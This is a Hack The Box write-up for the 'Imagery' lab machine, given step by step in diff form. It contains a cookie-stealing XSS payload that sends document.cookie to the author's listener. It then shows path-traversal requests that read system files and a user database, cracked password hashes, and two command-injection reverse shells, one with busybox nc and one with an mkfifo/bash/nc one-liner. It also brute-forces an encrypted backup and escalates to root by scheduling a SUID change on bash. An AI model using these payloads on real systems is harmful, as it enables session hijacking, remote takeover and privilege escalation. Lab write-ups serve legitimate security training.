@@ -1,0 +1,307 @@
+Hack the box Write Up Imagery
+https://labs.hackthebox.com/achievement/machine/477278/751
+
+
+Reg to website and log in
+
+XSS in report bug!
+
+on kali:
+$ python3 -m http.server 5353
+
+
+In burp suite:
+
+POST /report_bug HTTP/1.1
+Host: imagery.htb:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://imagery.htb:8000/
+Content-Type: application/json
+Content-Length: 108
+Origin: http://imagery.htb:8000
+Connection: keep-alive
+Cookie: session=.eJyrVkrJLC7ISaz0TFGyUjKzNDCwNLVMU9JRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHbmJFRmJydmpRQ4ZJUl6yfm5SrUAHEYvqg.aSm_4A.T9hdjvJP9m4OWOvGmw2t0qcY68Q
+Priority: u=0
+
+{"bugName":"test4",
+"bugDetails":"<img src=x onerror=this.src='http://10.10.14.64:5353/'+document.cookie>"
+
+
+Admin cookie:
+.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aSnnJA.xJH6fGjBFAWq4NO7TIt9S1EemRY
+
+
+
+https://blog.gregscharf.com/2023/04/09/lfi-to-rce-in-flask-werkzeug-application/
+LFI
+http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../../../../../../etc/passwd
+
+
+We found app.py file flask! by the way, file can be in /home/web/web =)
+
+GET /admin/get_system_log?log_identifier=../../../../../../../../../proc/self/cwd/app.py HTTP/1.1
+
+Host: imagery.htb:8000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Connection: keep-alive
+
+Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aSnkyw.QlrGq8F9hraVQlzED_fsVONAzAQ
+
+Upgrade-Insecure-Requests: 1
+
+Priority: u=0, i
+
+
+
+
+_load_data from utils -> ../../../../../../../../../home/web/web/utils.py
+config from * -> ../../../../../../../../../home/web/web/config.py
+db.json  -> ../../../../../../../../../home/web/web/db.json
+
+
+
+
+
+GET /admin/get_system_log?log_identifier=../../../../../../../../../home/web/web/db.json HTTP/1.1
+
+Host: imagery.htb:8000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Connection: keep-alive
+
+Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aSnkyw.QlrGq8F9hraVQlzED_fsVONAzAQ
+
+Upgrade-Insecure-Requests: 1
+
+Priority: u=0, i
+
+
+{
+    "users": [
+        {
+            "username": "admin@imagery.htb",
+            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
+            "isAdmin": true,
+            "displayId": "a1b2c3d4",
+            "login_attempts": 0,
+            "isTestuser": false,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        },
+        {
+            "username": "testuser@imagery.htb",
+            "password": "2c65c8d7bfbca32a3ed42596192384f6",
+            "isAdmin": false,
+            "displayId": "e5f6g7h8",
+            "login_attempts": 0,
+            "isTestuser": true,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        }
+
+Crack password testuser -> iambatman
+Login by testuser on the website, upload picture, and transformation it, do request and intercept it in Burp Suite
+
+
+
+kali:
+$ nc -lvnp 4545
+
+
+In x parametr we found command injection! No sh or python reverse shell work!
+Only busybox!
+
+POST /apply_visual_transform HTTP/1.1
+
+Host: imagery.htb:8000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://imagery.htb:8000/
+
+Content-Type: application/json
+
+Content-Length: 165
+
+Origin: http://imagery.htb:8000
+
+Connection: keep-alive
+
+Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aSnw-g.vmdQZsep3UDWF644048c04Fq2Io
+
+Priority: u=0
+
+
+
+{"imageId":"bbd126e1-3ce4-49a5-8c0a-720a3560e6b0","transformType":"crop","params":{"x":";busybox nc 10.10.14.64 4545 -e sh;"       ,"y":123,"width":225,"height":275}}
+
+
+
+When we have shell, we find in /var/backup interesting file.
+
+
+
+Download file with admin cookie
+http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../../../../../../var/backup/web_20250806_120723.zip.aes
+
+
+$ file web_20250806_120723.zip.aes 
+web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
+
+
+
+
+BruteForce password for aes and convert to zip
+https://github.com/wyn-cmd/pyAesBrute
+
+
+$ python3 -m venv myenv
+$ source myenv/bin/activate
+$ pip3 install pyAesCrypt
+
+$ python3 pybrute.py /home/kali/Desktop/rockyou.txt web_20250806_120723.zip.aes  web_20250806_120723.zip  
+   
+***brute forcing file...***
+  ***file decrypted***
+password: {bestfriends}
+time taken: 10.798500299453735
+61.95304731656513 passwords per second
+
+$ deactivate
+
+
+
+
+In web archive found file db.json and in db.json found mark creds
+
+        {
+            "username": "mark@imagery.htb",
+            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
+            "displayId": "868facaf",
+            "isAdmin": false,
+            "failed_login_attempts": 0,
+            "locked_until": null,
+            "isTestuser": false
+        }
+https://crackstation.net/
+Crack hash 01c3d2e5bdaf6134cec0a367cf53e535 -> supersmash
+
+ssh not worked =(
+
+
+
+
+After spent many times, i found a way)
+need use other payload to get a work shell!
+
+
+$ nc -nlvp 9001
+
+
+
+POST /apply_visual_transform HTTP/1.1
+
+Host: imagery.htb:8000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://imagery.htb:8000/
+
+Content-Type: application/json
+
+Content-Length: 160
+
+Origin: http://imagery.htb:8000
+
+Connection: keep-alive
+
+Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aSoUGw.QvaRkeSK8WYj8BNOstVZ2cSjnrc
+
+Priority: u=0
+
+
+
+{"imageId":"7a3047a6-690f-470f-aa06-ffe3f86d465e","transformType":"crop","params":{"x":";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.202 9001 >/tmp/f;","y":321,"width":291,"height":275}}
+
+
+
+
+BINGO! a normal shell where we can do this on machine.
+$ su mark
+supersmash
+
+$ cat /home/mark/user.txt
+843883b545a53d23e17ff3b4f6d51f5c
+
+
+
+-------------------------------------------------------------------------------------------------------------------
+
+
+
+$ sudo -l
+$ sudo /usr/local/bin/charcol --help
+Reset Password
+$ sudo /usr/local/bin/charcol -R
+
+Use enter without password
+$ sudo /usr/local/bin/charcol shell
+
+Restart shell
+Restart charcol shell
+
+Add new task
+$charcol> auto add --schedule "* * * * *" --command "chmod +s /bin/bash" --name="privesc"
+
+Enter password to mark - supersmash
+
+
+Check S uid on the bash:
+$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1474768 Oct 26  2024 /bin/bash
+
+
+
+Take a root:
+
+$ /bin/bash -p
+
+/bin/bash -p
+id
+uid=1002(mark) gid=1002(mark) euid=0(root) egid=0(root) groups=0(root),1002(mark)
+
+
+cat /root/root.txt
+
+7bfa2832e3f86b31336ad21677665644
+
